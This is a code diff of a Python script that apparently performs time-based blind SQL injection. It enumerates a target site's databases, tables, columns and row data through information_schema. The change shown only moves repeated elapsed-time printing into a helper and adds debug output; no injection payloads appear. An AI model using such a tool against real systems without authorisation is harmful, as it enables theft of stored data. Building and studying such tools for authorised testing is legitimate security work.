@@ -179,6 +179,7 @@ def measure_request_time(url, method, headers, cookies, data):
             threads.append(t)
         for t in threads:
             t.join()
+        print(times)
         return avg_time(times)
 
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
@@ -351,6 +352,14 @@ def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_nam
     result = find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, row_limit , where_params, where_values, where_conjunction)
     return result
 
+def time_check():
+    print("\n")
+    elapsed = time.time() - start_time
+    times_tables = str(datetime.timedelta(seconds=elapsed)).split(".")
+    times_tables = times_tables[0]
+    print('elapsed time: %s' % times_tables)
+    print('\n')
+
 def main(argv):
     global M_GET, M_POST, threads_num, verbose, log, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_SCHEMA, INF_SCHEMA_TABLES_TABLE_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_COLUMN_NAME
 
@@ -418,12 +427,7 @@ def main(argv):
         databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
         print('Found: %s' % databases[i])
         
-    print("\n")
-    elapsed = time.time() - start_time
-    times_datbases = str(datetime.timedelta(seconds=elapsed)).split(".")
-    times_datbases = times_datbases[0]
-    print('elapsed time: %s' % times_datbases)
-    print('\n')
+    time_check()
 
     choice = print_user_choice_table(databases, 'Databases found:')
     db_name = databases[choice]
@@ -436,18 +440,13 @@ def main(argv):
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_params, where_values)
     for i in range(rows_count):
         tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_params, where_values))
-    
+    ##########################
 
     choice = print_user_choice_table(tables, 'Tables found:')
     table_name = tables[choice]
     print('\nTable selected: %s\n' % table_name)
 
-    print("\n")
-    elapsed = time.time() - start_time
-    times_tables = str(datetime.timedelta(seconds=elapsed)).split(".")
-    times_tables = times_tables[0]
-    print('elapsed time: %s' % times_tables)
-    print('\n')
+    time_check()
     
     print('Looking for columns in %s, please wait...\n' % table_name)
     where_params = [INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_TABLE_SCHEMA]
@@ -459,12 +458,7 @@ def main(argv):
 
     print(columns)
     
-    print("\n")
-    elapsed = time.time() - start_time
-    times_columns = str(datetime.timedelta(seconds=elapsed)).split(".")
-    times_columns = times_columns[0]
-    print('elapsed time: %s' % times_columns)
-    print('\n')
+    time_check()
 
     print('\nLooking for %s data, please wait...\n' % table_name)
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, sleep_time)
@@ -484,12 +478,7 @@ def main(argv):
     for row in results:
         print(row)
 
-    print("\n")
-    elapsed = time.time() - start_time
-    times_data = str(datetime.timedelta(seconds=elapsed)).split(".")
-    times_data = times_data[0]
-    print('elapsed time: %s' % times_data)
-    print('\n')
+    time_check()
 
 
 if __name__ == "__main__":
